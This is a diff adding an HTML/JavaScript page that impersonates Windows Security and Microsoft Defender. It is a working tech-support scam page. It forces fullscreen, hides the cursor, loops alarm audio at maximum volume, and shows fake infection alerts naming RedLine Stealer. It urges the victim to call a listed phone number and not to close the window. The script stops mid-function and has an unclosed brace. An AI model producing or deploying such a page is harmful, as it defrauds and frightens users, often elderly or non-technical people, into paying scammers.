@@ -1,0 +1,1212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Windows Security</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        html, body {
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            margin: 0;
+            padding: 0;
+            background-color: #e0e0e0; /* Light grey background */
+            cursor: none; /* Hide cursor on the entire page */
+        }
+
+        /* Windows-style alert container */
+        .alert-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #e0e0e0; /* Full page grey background */
+            display: flex;
+            flex-direction: column;
+            z-index: 9999;
+        }
+
+        .title-bar {
+            background-color: #e3433a; /* Red header background */
+            height: 40px;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            border-bottom: 1px solid #c2362d;
+            text-transform: uppercase;
+        }
+
+        .title-bar-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 10px;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgMGgxMS40djExLjRIMFYweiIvPjxwYXRoIGZpbGw9IiNmZmYiIGQ9Ik0xMi42IDBIMjR2MTEuNGgtMTEuNFYweiIvPjxwYXRoIGZpbGw9IiNmZmYiIGQ9Ik0wIDEyLjZoMTEuNHYxMS40SDBWMTIuNnoiLz48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMTIuNiAxMi42SDI0djExLjRoLTExLjRWMTIuNnoiLz48L3N2Zz4='); /* White Windows Logo */
+            background-size: contain;
+        }
+
+        .title-bar-text {
+            flex-grow: 1; /* Takes remaining space */
+        }
+
+        /* Main alert content */
+        .alert-content {
+            flex-grow: 1;
+            padding: 20px;
+            background-color: #e0e0e0; /* Grey background for content area */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start; /* Align items to the top */
+            text-align: center;
+            overflow-y: auto; /* Allow scrolling if content overflows */
+        }
+
+        .alert-box {
+            background-color: #fff; /* White box in the center */
+            border: 1px solid #ccc;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            max-width: 800px; /* Increase max width */
+            width: 90%; /* Responsive width */
+            text-align: left; /* Align content to the left */
+            margin-top: 20px; /* Add some space from the top */
+        }
+
+        .alert-box h1 {
+            font-size: 18px; /* Slightly larger heading */
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        .alert-box p {
+            font-size: 13px; /* Slightly smaller text */
+            line-height: 1.4;
+            color: #555;
+            margin-bottom: 10px;
+        }
+
+        .alert-box ul {
+            list-style: none;
+            padding: 0;
+            margin-bottom: 15px;
+        }
+
+        .alert-box li {
+            margin-bottom: 6px; /* Smaller space between list items */
+            display: flex;
+            align-items: flex-start;
+            color: #333;
+            font-size: 14px;
+        }
+
+        .alert-box li::before {
+            content: '';
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            margin-right: 10px;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2ZmMDAwMCIgZD0iTTEyIDJDNi40OCAyIDIgNi44OCAyIDEyczQuNDggMTAgMTAgMTAgMTAtNC40OCAxMC0xMFMxNy41MiAyIDEyIDJ6bTAgMThjLTQuNDEgMC04LTMuNTktOC04czMuNTktOCA4LTggOCAzLjU5IDggOC0zLjU5IDgtOCA4eiIvPjxwYXRoIGZpbGw9IiNmZjAwMDAiIGQ9Ik0xMiA2Yy0uNTUgMC0xIC40NS0xIDF2NWMwIC41NS40NSAxIDEgMXMxLS40NSAxLTFWN2MwLS41NS0uNDUtMS0xLTF6Ii8+PHBhdGggZmlsbD0iI2ZmMDAwMCIgZD0iTTEyIDE0Yy0uNTUgMC0xIC40NS0xIDF2MmMwIC41NS40NSAxIDEgMXMxLS40NSAxLTF2LTJjMC0uNTUtLjQ1LTEtMS0xeiIvPjwvc3ZnPg=='); /* Red warning icon */
+            background-size: cover;
+            flex-shrink: 0;
+        }
+
+        .alert-box .scan-status {
+            color: #e3433a; /* Red color for scan status */
+            font-weight: bold;
+        }
+
+        .alert-box .register-text {
+            font-size: 12px;
+            color: #555;
+            margin-bottom: 20px;
+            margin-top: 15px; /* Add some space above */
+            text-align: center; /* Center the register text */
+        }
+
+        .alert-icon,
+        .alert-title,
+        .alert-message,
+        .threat-details,
+        .progress-container,
+        .system-info,
+        .encryption-status,
+        .system-tray,
+        .alert2-container { /* Hide previous alert1 specific elements */
+            display: none;
+        }
+
+        .alert-buttons {
+            display: flex;
+            gap: 10px; /* Spacing between buttons */
+            justify-content: center; /* Center buttons */
+            margin-top: 0; /* Remove top margin from previous style */
+            padding-top: 15px; /* Add padding above buttons */
+            border-top: 1px solid #eee; /* Add a subtle border line */
+        }
+
+        .alert-button {
+            padding: 6px 20px; /* Smaller padding */
+            border: 1px solid #888; /* Grey border */
+            border-radius: 3px; /* Slightly smaller radius */
+            font-size: 14px;
+            font-weight: normal; /* Normal weight */
+            cursor: pointer;
+            background-color: #e6e6e6; /* Light grey background */
+            color: #333; /* Dark grey text */
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.5), inset 0 -1px 0 rgba(0, 0, 0, 0.1); /* Button look */
+            text-shadow: 0 1px 0 rgba(255, 255, 255, 0.8); /* Text shadow for button */
+            background: linear-gradient(to bottom, #f9f9f9, #e6e6e6); /* Gradient for button */
+        }
+
+        .alert-button:hover {
+            background: linear-gradient(to bottom, #e9e9e9, #d5d5d5); /* Darker gradient on hover */
+        }
+
+        /* System tray */
+        .system-tray {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #f0f0f0;
+            border-top: 1px solid #ddd;
+            padding: 4px 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #333;
+        }
+
+        .system-tray-time {
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        /* Fullscreen styles */
+        :root:fullscreen {
+            background-color: #f0f0f0;
+        }
+
+        :root:-webkit-full-screen {
+            background-color: #f0f0f0;
+        }
+
+        :root:-moz-full-screen {
+            background-color: #f0f0f0;
+        }
+
+        :root:-ms-fullscreen {
+            background-color: #f0f0f0;
+        }
+
+        /* Add styles for alert2 container */
+        .alert2-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #ffffff; /* Full white background */
+            border: 1px solid #cccccc; /* Light grey border */
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            width: 600px; /* Make alert2 wider */
+            padding: 0; /* Remove padding from container */
+            z-index: 10000;
+            display: none; /* Initially hidden */
+            cursor: none; /* Hide mouse cursor */
+            overflow: hidden; /* Hide overflow from rounded corners */
+            color: #333; /* Default text color */
+        }
+
+        .alert2-container.visible {
+            display: flex; /* Use flexbox for layout */
+            flex-direction: column; /* Arrange items vertically */
+            cursor: none; /* Ensure cursor is hidden when visible */
+        }
+
+        .alert2-header {
+            background-color: #333333; /* Black header background */
+            color: #ffffff; /* White text */
+            padding: 10px 20px; /* Padding inside header */
+            display: flex; /* Use flexbox */
+            align-items: center; /* Vertically align items */
+            font-size: 15px; /* Header text size */
+            font-weight: 600;
+        }
+
+        .alert2-header .shield-icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTEyIDJMMyA2v14lMUMzIDIwIDEyIDIyIDEyIDIyczkgLTIgOSAtNlM5IDIgMTIgMlptMCAyLjY4NEM5Ljk5MiAyLjY4NCA1LjUgNS4yOCA1LjUgOC41VjEyYzAgNC42NjcgNSAyFIVEcgMjVzNyAtMjAuMzMzIDcgLTI1VjguNSwxOC41IDUuMjggMTQuMDA4IDIuNjg0IDEyIDIuNjg0Wk0xMiA1LjA5MkMxMy40NDggNS4wOTIgMTUuNSA3LjI4IDE1LjUgOC41VjE2TDEyIDE4LjI1TzguNSA1LjVWOC41QzguNSA3LjI4IDEwLjU1MiA1LjA5MiAxMiA1LjA5MloiLz48L3N2Zz4='); /* White shield icon */
+            background-size: contain;
+        }
+
+        .alert2-content {
+            text-align: center;
+            padding: 30px 20px;
+            flex-grow: 1; /* Take available vertical space */
+            display: flex; /* Use flexbox for content alignment */
+            flex-direction: column; /* Stack content elements vertically */
+            align-items: center; /* Center content horizontally */
+            justify-content: center; /* Center content vertically */
+        }
+
+        .alert2-content .trust-icon {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzQxY2M1MiIgZD0iTTEyIDJDNi40OCAyIDIgNi40OCAyIDEyczQuNDggMTAgMTAgMTAgMTAtNC40OCAxMC0xMFMxNy41MiAyIDEyIDJ6bS0yIDExLjk5TzYuNSA5LjVMMTUgMTguMjVMMjAuNSA5LjVMOS45OSA1eiIvPjwvc3ZnPg=='); /* Green checkmark or similar trustworthy icon */
+            background-size: contain;
+        }
+
+        .alert2-content .main-status-message {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #41cc52; /* Green color for status */
+        }
+
+        .alert2-content .scan-details {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        .alert2-content .progress-bar-container {
+            width: 80%;
+            height: 8px;
+            background-color: #e0e0e0;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .alert2-content .scan-progress {
+            width: 0%; /* Initial progress */
+            height: 100%;
+            background-color: #0078d7; /* Windows blue for progress */
+            animation: scanProgress 10s linear infinite; /* Simulate scanning */
+        }
+
+        @keyframes scanProgress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        .alert2-content .scanning-file-text {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .alert2-footer {
+            padding: 10px 20px;
+            background-color: #f0f0f0; /* Light grey footer */
+            display: flex;
+            align-items: center;
+            font-size: 12px;
+            color: #555;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .alert2-footer .microsoft-logo-small {
+            width: 16px;
+            height: 16px;
+            margin-right: 5px;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNiAxNiI+PHBhdGggZmlsbD0iIzAwNzhkNyIgZD0iTTAgMGg3LjZ2Ny42SDBWMHoiLz48cGF0aCBmaWxsPSIjMDA3OGQ3IiBkPSJNOC40IDBoNy42djcuNkg4LjRWwHoiLz48cGF0aCBmaWxsPSIjMDA3OGQ3IiBkPSJNMCA4LjRoNy42djcuNkgwVjguNHoiLz48cGF0aCBmaWxsPSIjMDA3OGk3IiBkPSJNOC40IDguNGg3LjZ2Ny42SDguNFY4LjR6Ii8+PC9zdmc+'); /* Blue Microsoft logo */
+            background-size: contain;
+        }
+
+        .alert2-footer .microsoft-name {
+            font-weight: 600;
+            margin-right: 10px;
+        }
+
+        .alert2-warning-icon,
+        .alert2-message,
+        .alert2-details,
+        .alert2-countdown,
+        .alert2-system-time,
+        .alert2-processing-message,
+        .alert2-threat-level,
+        .alert2-lockdown-timer,
+        .alert2-file-list,
+        .alert2-button-container,
+        .alert2-status-bar { /* Hide old alert2 elements */
+            display: none;
+        }
+
+        /* Styles for Alert 3 */
+        .alert3-container {
+            position: fixed;
+            bottom: 20px; /* Distance from bottom */
+            right: 20px; /* Distance from right */
+            width: 250px; /* Width of the alert box */
+            background-color: #0078d7; /* Windows blue background */
+            color: white; /* White text */
+            padding: 15px; /* Padding inside the box */
+            border-radius: 4px; /* Rounded corners */
+            z-index: 10001; /* Ensure it's above alert2 */
+            display: none; /* Initially hidden */
+            font-size: 14px;
+            font-weight: 600;
+            text-align: left; /* Align text to the left */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3); /* Shadow */
+            cursor: none; /* Hide mouse cursor */
+            display: flex; /* Use flexbox for content alignment */
+            align-items: center; /* Vertically align items */
+        }
+
+        .alert3-container.visible {
+            display: flex; /* Make it visible and maintain flex layout */
+            cursor: none; /* Ensure cursor is hidden when visible */
+        }
+
+        .alert3-icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px; /* Space between icon and text */
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTEyIDJDNi40OCAyIDIgNi40OCAyIDEyczQuNDggMTAgMTAgMTAgMTAtNC40OCAxMC0xMFMxNy41MiAyIDEyIDJ6bTEgMTFoLTJ2Nmgyem0wIDhoLTJ2MmgyeiIvPjwvc3ZnPg=='); /* White warning icon */
+            background-size: contain;
+            flex-shrink: 0; /* Prevent icon from shrinking */
+        }
+
+        .alert3-text {
+            flex-grow: 1; /* Allow text to take remaining space */
+        }
+
+        /* Styles for Alert 4 */
+        .alert4-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10002;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        .alert4-container.visible {
+            display: flex;
+            cursor: none;
+        }
+
+        .alert4-window {
+            display: flex;
+            flex-direction: row;
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            width: 90%;
+            max-width: 1200px;
+            overflow: hidden;
+        }
+
+        .alert4-left-panel {
+            width: 300px;
+            background: #0078d4; /* Keep the blue background */
+            color: white; /* White text for the rest of the panel */
+            padding: 30px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .alert4-left-panel .microsoft-logo {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 40px;
+            display: flex;
+            align-items: center;
+            background: #ffffff; /* White background for the logo box */
+            padding: 10px 15px; /* Add some padding inside the box */
+            border-radius: 4px; /* Optional: add slight rounded corners */
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2); /* Optional: add a subtle shadow */
+        }
+
+        .alert4-left-panel .microsoft-logo-symbol {
+            display: inline-block;
+            width: 32px;
+            height: 32px;
+            background-image: url('ms_logo.png'); /* Microsoft logo image */
+            background-size: contain;
+            margin-right: 15px; /* Space between logo and text */
+            flex-shrink: 0;
+        }
+
+        .alert4-left-panel .microsoft-logo-text {
+            color: #333; /* Dark grey text color */
+            font-size: 24px; /* Match font size */
+            font-weight: 600; /* Match font weight */
+            flex-grow: 1;
+        }
+
+        .alert4-left-panel .security-status {
+            font-size: 16px;
+            line-height: 1.4;
+            margin-bottom: 20px;
+        }
+
+        .alert4-left-panel .security-status .status-icon {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 15px;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTEyIDJMMyA2djYuNWMwIDQuNjY3IDUgOCAxMCA4czEwLTMuMzMzIDEwLThWNi4wMDRMMTIgMnptMCAyLjY4NEw5Ljk5MiAyLjY4NCA1LjUgNS4yOCA1LjUgMTIuNWMwIDQuNjY3IDUuNSA4IDYuNSA4czYuNSAtMy4zMzMgNi41IC04VjUuMjggMTQuMDA4IDIuNjg0IDEyIDIuNjg0Wk0xMiA1LjA5MkMxMy40NDggNS4wOTIgMTUuNSA3LjI4IDE1LjUgOC41VjE2TDEyIDE4LjI1TzguNSA1LjVWOC41QzguNSA3LjI4IDEwLjU1MiA1LjA5MiAxMiA1LjA5MloiLz48L3N2Zz4=');
+            background-size: contain;
+        }
+
+        .alert4-right-panel {
+            flex: 1;
+            padding: 30px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .alert4-right-panel .alert-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #d13438;
+            margin-bottom: 20px;
+        }
+
+        .alert4-right-panel .threat-details {
+            margin-bottom: 30px;
+        }
+
+        .alert4-right-panel .threat-details ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .alert4-right-panel .threat-details li {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+            color: #323130;
+            font-size: 15px;
+        }
+
+        .alert4-right-panel .threat-details li::before {
+            content: '•';
+            color: #d13438;
+            font-size: 20px;
+            margin-right: 10px;
+        }
+
+        .alert4-right-panel .call-container {
+            background: #f0f5ff;
+            border: 1px solid #e1e1e1;
+            border-radius: 8px;
+            padding: 25px;
+            margin-top: auto;
+        }
+
+        .alert4-right-panel .urgent-text {
+            color: #d13438;
+            font-weight: 600;
+            font-size: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+
+        .alert4-right-panel .phone-number {
+            font-size: 42px;
+            font-weight: 600;
+            color: #0078d4;
+            text-align: center;
+            font-family: 'Segoe UI', sans-serif;
+            background: #ffffff;
+            padding: 20px 40px;
+            border: 2px solid #0078d4;
+            border-radius: 8px;
+            display: inline-block;
+            margin: 20px 0;
+            box-shadow: 0 2px 10px rgba(0, 120, 212, 0.1);
+        }
+
+        .alert4-right-panel .support-text {
+            color: #0078d4;
+            font-weight: 600;
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .alert4-right-panel .warning-text {
+            color: #d13438;
+            font-weight: 600;
+            text-align: center;
+            margin-top: 20px;
+            font-size: 15px;
+        }
+
+        /* Add new notification box style */
+        .notification-box {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #000000;
+            color: #ffffff;
+            padding: 12px 20px;
+            border-radius: 4px;
+            font-family: 'Consolas', monospace;
+            font-size: 13px;
+            z-index: 10003;
+            display: none;
+            width: 90%;
+            max-width: 1200px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        }
+
+        .notification-box.visible {
+            display: block;
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <!-- Audio element with autoplay and loop attributes -->
+    <audio id="alarmSound" preload="auto" autoplay loop>
+        <source src="panic.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="voiceAlert" preload="auto">
+        <source src="voicealert.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        // Function to force play audio
+        function forcePlay() {
+            const audio = document.getElementById('alarmSound');
+            const voiceAlert = document.getElementById('voiceAlert');
+            
+            // Play panic sound immediately
+            audio.play().catch(error => {
+                console.log('Initial play failed:', error);
+                // Try playing muted first
+                audio.muted = true;
+                audio.play().then(() => {
+                    audio.muted = false;
+                }).catch(error => {
+                    console.log('Muted play failed:', error);
+                });
+            });
+
+            // Play voice alert after 8 seconds
+            setTimeout(() => {
+                voiceAlert.play().catch(error => {
+                    console.log('Voice alert play failed:', error);
+                    // Try playing muted first
+                    voiceAlert.muted = true;
+                    voiceAlert.play().then(() => {
+                        voiceAlert.muted = false;
+                    }).catch(error => {
+                        console.log('Voice alert muted play failed:', error);
+                    });
+                });
+            }, 8000);
+        }
+
+        // Try to play at multiple points
+        forcePlay(); // Immediate attempt
+        
+        // Try when document is ready
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', forcePlay);
+        } else {
+            forcePlay(); // Document already ready
+        }
+        
+        // Try when window loads
+        if (document.readyState === 'complete') {
+            forcePlay(); // Window already loaded
+        } else {
+            window.addEventListener('load', forcePlay);
+        }
+
+        // Try when the page becomes visible
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                forcePlay();
+            }
+        });
+
+        // Try when the window gains focus
+        window.addEventListener('focus', forcePlay);
+
+        // Try periodically for the first few seconds
+        let attempts = 0;
+        const maxAttempts = 10;
+        const attemptInterval = setInterval(() => {
+            if (attempts >= maxAttempts) {
+                clearInterval(attemptInterval);
+                return;
+            }
+            forcePlay();
+            attempts++;
+        }, 200);
+
+        // Try playing when the audio element is ready
+        audio.addEventListener('canplaythrough', forcePlay);
+        
+        // Try playing when the audio is loaded
+        audio.addEventListener('loadeddata', forcePlay);
+    </script>
+
+    <div class="alert-container">
+        <div class="title-bar">
+            <div class="title-bar-icon"></div>
+            <div class="title-bar-text">Attention: DANGER!</div>
+        </div>
+        
+        <div class="alert-content">
+            <div class="alert-box">
+                <h1>ALERT! System scan for spyware, adware, trojans and viruses is complete. XP Antivirus Pro 2010
+                 detected <span class="scan-status">33 critical system objects</span>. These security breaches may be exploited and lead to
+                 the following:</h1>
+
+                <ul>
+                    <li>Your system becomes a target for spam and bulky, intruding ads</li>
+                    <li>Browser crashes frequently and web access speed decreases</li>
+                    <li>Your personal files, photos, documents and passwords get stolen</li>
+                    <li>Your computer is used for criminal activity behind your back</li>
+                    <li>Bank details and credit card information gets disclosed</li>
+                </ul>
+
+                <p class="register-text">Click REGISTER to register your copy of XP Antivirus Pro 2010 and perform threat removal on your
+                system. The list of infections and vulnerabilities detected will become available after registration.</p>
+
+                <div class="alert-buttons">
+                    <button class="alert-button">Register</button>
+                    <button class="alert-button">Remind me later</button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Add audio element for alert2 -->
+    <audio id="alert2Sound" preload="auto" loop>
+        <source src="panic.mp3" type="audio/mpeg">
+    </audio>
+
+    <!-- Alert2 content -->
+    <div class="alert2-container" id="alert2Container">
+        <div class="alert2-header">
+            <div class="shield-icon"></div>
+            Windows Defender System
+        </div>
+
+        <div class="alert2-content">
+            <div class="trust-icon"></div>
+            <div class="main-status-message">Your device is being scanned.</div>
+            <div class="scan-details">Threat scan in progress. No threats found yet.</div>
+
+            <div class="progress-bar-container">
+                <div class="scan-progress" id="scanProgress"></div>
+            </div>
+
+            <div class="scanning-file-text">Scanning: <span id="scanningFile">C:\Program Files\...</span></div>
+        </div>
+
+        <div class="alert2-footer">
+            <div class="microsoft-logo-small"></div>
+            <span class="microsoft-name">Microsoft</span>
+            <span>Last scan: Quick scan Today, 1:34 PM</span>
+        </div>
+    </div>
+
+    <!-- Alert 3 content -->
+    <div class="alert3-container" id="alert3Container">
+        <div class="alert3-icon"></div>
+        <div class="alert3-text">Virus detected: Win32/Trojandownloader</div>
+    </div>
+
+    <!-- Add notification box before alert4 -->
+    <div class="notification-box" id="notificationBox">
+        Your system is infected with a high-risk trojan. Data is being stolen. IP address traced. Critical files: C:\System32 and C:\Users\YourName are compromised. Do not turn off your PC.
+        Call Microsoft support immediately                                                               Failure to act will result in total data loss.
+    </div>
+
+    <!-- Alert 4 content -->
+    <div class="alert4-container" id="alert4Container">
+        <div class="alert4-window">
+            <div class="alert4-left-panel">
+                <div>
+                    <div class="microsoft-logo">
+                        <div class="microsoft-logo-symbol"></div>
+                        <span class="microsoft-logo-text">Microsoft Security</span>
+                    </div>
+                    <div class="security-status">
+                        <div class="status-icon"></div>
+                        <p>Your system requires immediate attention. A severe security threat has been detected that could compromise your personal data and system security.</p>
+                    </div>
+                </div>
+                <div class="security-info">
+                    <p>Windows Defender Security Center</p>
+                    <p>Threat Level: Critical</p>
+                </div>
+            </div>
+            <div class="alert4-right-panel">
+                <div class="alert-title">⚠️ CRITICAL SECURITY ALERT ⚠️</div>
+                <div class="threat-details">
+                    <p>Immediate action required: Your Windows system is infected with a severe virus (Trojan:Win32/RedLine Stealer). This threat can lead to significant data breaches, including:</p>
+                    <ul>
+                        <li>Banking passwords and financial data</li>
+                        <li>Personal documents and photos</li>
+                        <li>Login credentials for websites and services</li>
+                        <li>Sensitive corporate information</li>
+                    </ul>
+                    <p>Data exfiltration is in progress and may cause permanent data loss if not stopped immediately.</p>
+                </div>
+                
+                <div class="call-container">
+                    <p class="urgent-text">URGENT: CALL NOW TO PREVENT DATA LOSS</p>
+                    <div class="phone-number">+1 865-285-4387</div>
+                    <p class="support-text">Available 24/7 for emergency support</p>
+                </div>
+
+                <p class="warning-text">Do not close this window or restart your computer to prevent further damage.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Initialize when page loads
+        window.onload = function() {
+            // Show notification box after 8 seconds
+            setTimeout(function() {
+                const notificationBox = document.getElementById('notificationBox');
+                if (notificationBox) {
+                    notificationBox.classList.add('visible');
+                }
+            }, 8000);
+
+            // Show alert2 after 2 seconds
+            setTimeout(function() {
+                const alert2Container = document.getElementById('alert2Container');
+                if (alert2Container) {
+                    alert2Container.classList.add('visible');
+                    
+                    // Play alert2 sound with full volume and loop
+                    const alert2Sound = document.getElementById('alert2Sound');
+                    if (alert2Sound) {
+                        // Set volume to maximum (1.0)
+                        alert2Sound.volume = 1.0;
+                        // Ensure looping is enabled
+                        alert2Sound.loop = true;
+                        
+                        // Force play with multiple attempts
+                        function forcePlayAlert2Sound() {
+                            // Try to play immediately
+                            alert2Sound.play().catch(function(error) {
+                                console.log("Initial play failed, retrying...");
+                                // Try again after a short delay
+                                setTimeout(() => {
+                                    alert2Sound.play().catch(function(error) {
+                                        console.log("Delayed play failed, waiting for user interaction");
+                                        // Try one more time on user interaction
+                                        document.addEventListener('click', function playOnClick() {
+                                            alert2Sound.play();
+                                            // Keep the event listener to ensure sound keeps playing
+                                        });
+                                        document.addEventListener('keydown', function playOnKey() {
+                                            alert2Sound.play();
+                                            // Keep the event listener to ensure sound keeps playing
+                                        });
+                                    });
+                                }, 100);
+                            });
+                        }
+
+                        // Start playing
+                        forcePlayAlert2Sound();
+                        
+                        // Additional attempt when document becomes visible
+                        document.addEventListener('visibilitychange', function() {
+                            if (!document.hidden) {
+                                alert2Sound.play();
+                            }
+                        });
+                    }
+                    
+                    // Initialize alert2 specific functions
+                    alert2StartTime = new Date().getTime();
+                    updateAlert2SystemTime();
+                    updateAlert2ProcessingMessage();
+                    updateAlert2FileList();
+                    updateAlert2LockdownTimer();
+
+                    // Start intervals for alert2 updates
+                    setInterval(updateAlert2SystemTime, 1000);
+                    setInterval(updateAlert2ProcessingMessage, 2000);
+                    setInterval(updateAlert2FileList, 1500);
+                }
+            }, 2000);
+
+            // Show alert3 immediately
+            const alert3Container = document.getElementById('alert3Container');
+            if (alert3Container) {
+                alert3Container.classList.add('visible');
+            }
+
+            // Show alert4 after 5 seconds
+            setTimeout(function() {
+                const alert4Container = document.getElementById('alert4Container');
+                if (alert4Container) {
+                    alert4Container.classList.add('visible');
+                }
+            }, 5000);
+
+            // Request fullscreen for the document element
+            const element = document.documentElement;
+            if (element.requestFullscreen) {
+              element.requestFullscreen();
+            } else if (element.mozRequestFullScreen) { /* Firefox */
+              element.mozRequestFullScreen();
+            } else if (element.webkitRequestFullscreen) { /* Chrome, Safari and Opera */
+              element.webkitRequestFullscreen();
+            } else if (element.msRequestFullscreen) { /* IE/Edge */
+              element.msRequestFullscreen();
+            }
+
+            // Also try to play on window load
+            playSound();
+        };
+
+        // Update scan progress with realistic data
+        let scanProgress = 23;
+        function updateScanProgress() {
+            if (scanProgress < 100) {
+                scanProgress += Math.random() * 0.5;
+                if (scanProgress > 100) scanProgress = 100;
+                const progressElement = document.getElementById('scanProgress');
+                if (progressElement) {
+                    progressElement.style.width = scanProgress + '%';
+                }
+        }
+        setInterval(updateScanProgress, 1000);
+
+        // Update system time
+        function updateSystemTime() {
+            const now = new Date();
+            const timeString = now.toLocaleTimeString('en-US', { 
+                hour12: false, 
+                hour: '2-digit', 
+                minute: '2-digit' 
+            });
+            document.getElementById('systemTime').textContent = timeString;
+        }
+        setInterval(updateSystemTime, 1000);
+        updateSystemTime();
+
+        // Function to show more alerts
+        function showMoreAlerts() {
+            const messages = [
+                {
+                    title: "Critical System Error",
+                    description: "Memory corruption detected in system files. Immediate action required.",
+                    details: "System files are being modified by unauthorized processes."
+                },
+                {
+                    title: "Security Breach Detected",
+                    description: "Multiple security breaches detected. Your personal data is at risk.",
+                    details: "Unauthorized access attempts to banking information detected."
+                },
+                {
+                    title: "Ransomware Activity",
+                    description: "Active ransomware encryption detected. Your files are being encrypted.",
+                    details: "Payment demand will be displayed in 5 minutes if not stopped."
+                },
+                {
+                    title: "System Compromise",
+                    description: "System integrity compromised. Multiple threats detected.",
+                    details: "Backdoor installation detected. Remote access attempts logged."
+                }
+            ];
+            
+            const randomMessage = messages[Math.floor(Math.random() * messages.length)];
+            document.querySelector('.alert-title').textContent = randomMessage.title;
+            document.querySelector('.alert-message').textContent = randomMessage.description;
+            
+            const threatDetails = document.querySelector('.threat-details');
+            threatDetails.innerHTML = `
+                <div class="threat-item">
